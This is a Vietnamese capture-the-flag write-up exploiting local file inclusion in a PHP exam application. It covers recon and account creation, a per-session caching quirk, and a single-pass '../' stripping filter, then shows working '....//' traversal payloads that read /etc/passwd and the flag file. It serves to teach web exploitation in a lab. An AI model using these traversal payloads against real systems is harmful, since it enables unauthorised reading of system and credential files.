<img width="303" height="128" alt="image" src="https://github.com/user-attachments/assets/7e016e62-f05e-467a-807c-bb744b462536" />

<img width="806" height="180" alt="image" src="https://github.com/user-attachments/assets/15c01a88-18e3-4343-9636-ec057948a5d1" />


01 Recon

```bash
curl -s -i http://144.79.188.36:7003/ | head -12
```

```http
HTTP/1.1 200 OK
X-Powered-By: PHP/8.3.33
Set-Cookie: g3ren9_session=a6294be8bcb37a69c0dc8edb4df1475f; path=/; HttpOnly; SameSite=Lax
```

App `g3ren9 Exam` — login/register, `style.css` là asset duy nhất. Đăng ký rồi đăng nhập:

```bash
POST /register.php   display_name=eng&username=engr9x&password=Passw0rd12345
POST /login.php      username=engr9x&password=Passw0rd12345
```

Bên trong có: `exam.php`, `submit.php`, `profile.php`, `scoreboard.php`, `upload_avatar.php`.

02 Sink: `exam_format` đi thẳng vào `include()`

`exam.php` render đề thi, và form nộp bài mang theo format qua hidden input:

```html
<form method="post" action="/submit.php" class="questions">
<input type="hidden" name="exam_format" value="vi.php">
```

`en.php` / `jp.php` cũng tồn tại (link ở cuối trang). Một tham số nhận **tên file `.php`** ⇒ thử LFI ngay.

03 format bị **khoá theo session**

Lần đầu thử, mọi payload trả về **y hệt nhau** — trông như tham số đã bị vá:

| `exam_format` | len | md5 |
|---|---|---|
| `vi.php` | 4448 | `df2dc95597` |
| `en.php` | 4448 | `df2dc95597` |
| `jp.php` | 4448 | `df2dc95597` |
| `../../../../vi.php` | 4448 | `df2dc95597` |
| `....//…/etc/passwd` | 4448 | `df2dc95597` |
| `php://filter/…` | 4448 | `df2dc95597` |

**chỉ request `exam.php` ĐẦU TIÊN của một session được ghi nhận**; mọi request sau trong cùng session bị bỏ qua hoàn toàn. Vì dùng lại một session, tất cả payload đều bị nuốt.

Mở **session mới cho từng payload**:

| `exam_format` (session sạch) | len | nội dung |
|---|---|---|
| `vi.php` | 4665 | đề tiếng Việt |
| `en.php` | 4686 | *Which HTTP code usually means that a resource does not exist?* |
| `jp.php` | 4406 | リソースが存在しないことを示すHTTPコードはどれですか。 |

khi một tham số "có vẻ không có tác dụng", kiểm tra xem nó có bị **cache ở server/session** không, trước khi kết luận là đã bị vá. Dấu hiệu: mọi giá trị khác nhau trả về **cùng một độ dài và cùng md5**.

04
Nhận diện sanitizer

Với session sạch, so sánh các độ sâu `../`:

```
../vi.php                -> render đề tiếng Việt
../../../../vi.php       -> render đề tiếng Việt   (giống hệt)
```

`../vi.php` mà vẫn ra đề tiếng Việt ⇒ `../` đã bị **strip** trước khi include, chứ không phải traversal thật. Đây là dấu hiệu của một lượt `str_replace('../', '', $input)`.

05
Bypass: `....//`

Một lượt thay thế **không lặp lại**, nên biến thể lồng nhau sẽ sống sót:

```
....//....//....//....//etc/passwd
└ sau 1 lượt str_replace('../','') ┘
    -> ../../../../etc/passwd
```

Đo độ sâu bằng `/etc/passwd`:

| payload | kết quả |
|---|---|
| `....//`×3 + `etc/passwd` | `Not found.` (10 byte) |
| `....//`×4 + `etc/passwd` | **839 byte** — `/etc/passwd` thật |

**4** cấp (không phải 3) nên include có thêm một thư mục tiền tố so với docroot.
`..` dư bị OS clamp ở `/` nên ×4, ×5, ×6 đều cho cùng kết quả.

06

```bash
# request ĐẦU TIÊN của session mới, ngay sau login
GET /exam.php?exam_format=....//....//....//....//de_thi_chinh_thuc.txt
```

```
PTITCTF{9Ud_J0Ob_w3lc0m3_tO_Th3_RoY4L_Ac4d3mY_BTYT}
```
